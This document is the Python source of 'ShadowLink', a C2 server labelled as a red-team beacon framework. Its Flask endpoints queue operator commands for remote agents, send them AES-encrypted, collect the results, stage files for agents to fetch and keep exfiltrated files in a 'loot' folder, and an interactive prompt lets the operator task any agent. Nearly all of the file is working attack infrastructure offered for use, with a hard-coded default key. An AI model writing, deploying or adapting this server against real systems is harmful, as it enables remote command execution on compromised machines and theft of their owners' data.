#!/usr/bin/env python3
# ShadowLink - Lightweight C2 Framework for Red Teams
# Author: Zane Anderson (zanderson@iscsecurity.org)

from flask import Flask, request, jsonify, send_file
from base64 import b64decode, b64encode
import threading
import argparse
import logging
import os
from datetime import datetime

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[!] PyCryptodome not found. Run: sudo pip3 install pycryptodome")
    exit(1)

# Suppress Flask HTTP request logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Banner
BLUE = "\033[1;34m"
RESET = "\033[0m"

print(f"{BLUE}")
print("   _____ _               _           _     _       _     ")
print("  / ____| |             | |         | |   (_)     | |    ")
print(" | (___ | |__   ___  ___| | ___  ___| |__  _ _ __ | |__  ")
print("  \\___ \\| '_ \\ / _ \\/ __| |/ _ \\/ __| '_ \\| | '_ \\| '_ \\ ")
print("  ____) | | | |  __/ (__| |  __/ (__| | | | | |_) | | | |")
print(" |_____/|_| |_|\\___|\\___|_|\\___|\\___|_| |_|_| .__/|_| |_|")
print("                                           | |          ")
print("                                           |_|          ")
print("         ShadowLink C2 - Red Team Beacon Framework      ")
print(f"{RESET}")

app = Flask(__name__)

# Task + result storage
task_queue = {}
result_store = {}
active_agents = {}

UPLOAD_FOLDER = 'uploads'
LOOT_FOLDER = 'loot'
LOG_FOLDER = 'logs'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(LOOT_FOLDER, exist_ok=True)
os.makedirs(LOG_FOLDER, exist_ok=True)

def log_session(agent_id, task, result):
    with open(os.path.join(LOG_FOLDER, f"{agent_id}.log"), 'a') as log_file:
        log_file.write(f"\n[TASK] {datetime.now().isoformat()}\n{task}\n")
        log_file.write(f"[RESULT]\n{result}\n{'='*50}\n")

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC, iv=key[:16])
    return cipher.encrypt(pad(data.encode(), AES.block_size))

def decrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC, iv=key[:16])
    return unpad(cipher.decrypt(data), AES.block_size).decode()

@app.route('/task/<agent_id>', methods=['GET'])
def get_task(agent_id):
    active_agents[agent_id] = datetime.now()
    task = task_queue.pop(agent_id, '')
    if task:
        enc = encrypt(task, AES_KEY)
        return b64encode(enc).decode()
    return ''

@app.route('/result/<agent_id>', methods=['POST'])
def receive_result(agent_id):
    data = request.data.decode()
    raw = b64decode(data)
    try:
        decoded = decrypt(raw, AES_KEY)
    except Exception as e:
        decoded = f"[!] Decryption failed: {str(e)}"

    result_store[agent_id] = decoded
    print(f"\n[+] Result from {agent_id}:\n{decoded}\n")
    log_session(agent_id, "(auto-task result)", decoded)
    return 'OK'

@app.route('/upload/<agent_id>', methods=['POST'])
def upload_file(agent_id):
    file = request.files.get('file')
    if not file:
        return 'No file provided', 400
    filepath = os.path.join(UPLOAD_FOLDER, f"{agent_id}_{file.filename}")
    file.save(filepath)
    task_queue[agent_id] = f"fetch_file {file.filename}"
    print(f"[+] File uploaded for {agent_id}: {file.filename}")
    return 'File uploaded'

@app.route('/download/<agent_id>/<filename>', methods=['GET'])
def download_file(agent_id, filename):
    filepath = os.path.join(LOOT_FOLDER, f"{agent_id}_{filename}")
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return 'File not found', 404

def operator_prompt():
    while True:
        try:
            agent_id = input("\n[>] Agent ID: ").strip()

            if agent_id.lower() == 'list_agents':
                print("\n[+] Active Agents:")
                for aid, timestamp in active_agents.items():
                    print(f"- {aid}  (Last seen: {timestamp.strftime('%Y-%m-%d %H:%M:%S')})")
                continue

            if not agent_id:
                print("[!] Agent ID cannot be empty.")
                continue

            cmd = input("[>] Command to run: ").strip()
            if not cmd:
                print("[!] Command cannot be empty.")
                continue

            task_queue[agent_id] = cmd
            log_session(agent_id, cmd, "[Queued]")
            print(f"[*] Task for {agent_id} queued. Waiting for result...\n")
        except KeyboardInterrupt:
            print("\n[!] Operator session interrupted. Exiting prompt.")
            break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="ShadowLink C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Host to bind the Flask server")
    parser.add_argument("--port", type=int, default=8000, help="Port to run the C2 server")
    parser.add_argument("--key", help="32-byte AES key string")
    args = parser.parse_args()

    if args.key:
        AES_KEY = args.key.encode()
    else:
        AES_KEY = (args.key or 'Your32ByteSuperSecureKey!!123456').encode()
        print("[!] Warning: Using default AES key. For real ops, use --key to specify a custom 32-byte key.")

    if len(AES_KEY) != 32:
        print("[!] AES key must be exactly 32 bytes.")
        exit(1)

    print(f"[+] ShadowLink C2 server starting on http://{args.host}:{args.port}")
    threading.Thread(target=lambda: app.run(host=args.host, port=args.port), daemon=True).start()
    print("[*] Flask server running in background.\n")
    operator_prompt()
